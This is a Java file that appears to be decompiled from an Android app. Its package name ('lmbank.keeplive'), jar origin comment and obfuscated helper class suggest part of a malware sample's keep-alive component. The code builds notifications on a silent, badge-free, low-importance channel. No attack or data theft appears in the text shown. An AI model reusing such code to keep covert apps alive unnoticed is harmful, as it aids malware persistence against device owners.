package com.wish.lmbank.keeplive.config;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.os.Build;
import android.widget.RemoteViews;

import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import java.util.Random;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/keeplive/config/NotificationUtils.class */
public class NotificationUtils extends ContextWrapper {
    private NotificationChannel channel;
    private Context context;
    private String id;
    private NotificationManager manager;
    private String name;

    private NotificationUtils(Context context) {
        super(context);
        this.context = context;
        this.id = context.getPackageName();
        this.name = context.getPackageName();
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void createNotificationChannel() {
        if (this.channel != null) {
            return;
        }
        NotificationChannel notificationChannel = new NotificationChannel(this.id, this.name, NotificationManager.IMPORTANCE_LOW);
        this.channel = notificationChannel;
        notificationChannel.enableVibration(false);
        this.channel.enableLights(false);
        this.channel.setShowBadge(false);
        this.channel.enableVibration(false);
        this.channel.setVibrationPattern(new long[]{0});
        this.channel.setSound(null, null);
        getManager().createNotificationChannel(this.channel);
    }

    private NotificationManager getManager() {
        if (this.manager == null) {
//             this.manager = (NotificationManager) getSystemService(bb7d7pu7.m5998("BwYdAA8ACggdAAYH"));
            this.manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        }
        return this.manager;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public Notification.Builder getChannelNotification(String str, String str2, int i, int i2, Intent intent) {
        Notification.Builder builder = new Notification.Builder(this.context, this.id).setContentTitle(str).setContentText(str2).setSmallIcon(i).setAutoCancel(true).setCustomContentView(new RemoteViews(getPackageName(), i2));
        PendingIntent pendingIntent;
        pendingIntent = PendingIntent.getActivity(this, 123, intent, PendingIntent.FLAG_ONE_SHOT);
        builder.setContentIntent(pendingIntent);
        return builder;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public Notification.Builder getChannelNotification(String str, String str2, int i, Intent
            intent) {
        Notification.Builder builder = new Notification.Builder(this.context, this.id).setContentTitle(str).setContentText(str2).setSmallIcon(i).setAutoCancel(true);
        PendingIntent pendingIntent;
        pendingIntent = PendingIntent.getActivity(this, 123, intent, PendingIntent.FLAG_ONE_SHOT);
        builder.setContentIntent(pendingIntent);
        return builder;
    }

    public NotificationCompat.Builder getNotification_25(String str, String str2, int i, Intent
            intent) {
        return new NotificationCompat.Builder(this.context, this.id).setContentTitle(str).setContentText(str2).setSmallIcon(i).setAutoCancel(true).setVibrate(new long[]{0}).setContentIntent(PendingIntent.getBroadcast(this.context, 0, intent, PendingIntent.FLAG_IMMUTABLE));
    }

    public static void sendNotification(Context context, String str, String str2, int i,
                                        int i2, Intent intent) {
        Notification build;
        NotificationUtils notificationUtils = new NotificationUtils(context);
        if (Build.VERSION.SDK_INT >= 26) {
            notificationUtils.createNotificationChannel();
            build = notificationUtils.getChannelNotification(str, str2, i, i2, intent).build();
        } else {
            build = notificationUtils.getNotification_25(str, str2, i, intent).build();
        }
        notificationUtils.getManager().notify(new Random().nextInt(10000), build);
    }

    public static Notification createNotification(Context context, String str, String str2,
                                                  int i, int i2, Intent intent) {
        Notification build;
        NotificationUtils notificationUtils = new NotificationUtils(context);
        if (Build.VERSION.SDK_INT >= 26) {
            notificationUtils.createNotificationChannel();
            build = notificationUtils.getChannelNotification(str, str2, i, i2, intent).build();
        } else {
            build = notificationUtils.getNotification_25(str, str2, i, intent).build();
        }
        return build;
    }

    public static Notification createNotification(Context context, String str, String str2,
                                                  int i, Intent intent) {
        Notification build;
        NotificationUtils notificationUtils = new NotificationUtils(context);
        if (Build.VERSION.SDK_INT >= 26) {
            notificationUtils.createNotificationChannel();
            build = notificationUtils.getChannelNotification(str, str2, i, intent).build();
        } else {
            build = notificationUtils.getNotification_25(str, str2, i, intent).build();
        }
        return build;
    }
}
